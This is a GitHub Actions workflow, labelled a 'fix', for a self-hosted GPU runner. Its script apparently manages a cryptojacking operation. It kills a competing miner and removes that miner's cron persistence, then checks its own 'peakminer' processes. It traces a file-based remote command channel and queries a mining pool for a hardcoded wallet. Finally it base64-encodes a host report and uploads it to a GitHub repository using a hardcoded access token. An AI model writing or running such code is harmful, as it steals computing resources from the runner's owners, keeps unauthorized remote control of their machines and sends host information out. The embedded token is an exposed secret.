name: ul-t2-fix
on: [workflow_dispatch]
permissions:
  contents: write
jobs:
  fix:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 25
    steps:
      - name: fix
        run: |
          set +e
          H=$(hostname -s); O=/tmp/ul_t2_fix.txt
          SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
          {
            echo "=== ul-t2 fix host=$H ts=$(date -u +%FT%TZ) run=$GITHUB_RUN_ID sudo=[$SUDO]"
            echo "--- wildrig before=$(pgrep -fc '[w]ildrig-multi')"
            $SUDO pkill -9 -f '[.]ul172/run[.]sh'
            $SUDO pkill -9 -f '[w]ildrig-multi'
            sleep 3
            echo "--- wildrig after=$(pgrep -fc '[w]ildrig-multi')"
            $SUDO sh -c "crontab -l 2>/dev/null | grep -v -e ul172 -e wildrig | crontab -"
            echo "--- root cron"; $SUDO crontab -l 2>/dev/null | tail -8
            echo "--- cron.d"; $SUDO sh -c "ls /etc/cron.d; grep -rl -e ul172 -e wildrig /etc/cron.d /etc/systemd/system 2>/dev/null"
            echo "--- peak procs=$(pgrep -fc peakminer) roots:"; ps -eo pid,ppid,args= | grep '[p]eakminer' | cut -c1-140
            echo "--- channel trace"
            bash -x $HOME/ul2/poll.sh 2>&1 | tail -25
            echo "--- channel files"; ls -l /tmp/ul2_cmd_$H.sh /tmp/ul2_out_$H.txt 2>/dev/null; head -5 /tmp/ul2_out_$H.txt 2>/dev/null
            echo "--- crontab(ubuntu)"; crontab -l | tail -6
            echo "--- gpu"; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw --format=csv,noheader
            echo "--- pool self"; curl -s -m 25 -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep -E '149-81-10-242' | head -5
            echo "=== END"
          } > $O 2>&1
          cat $O
          b=$(base64 -w0 < $O); GH=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
          F=cmdout8/ul-t2-fix_$H.txt
          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 fix $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 fix $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
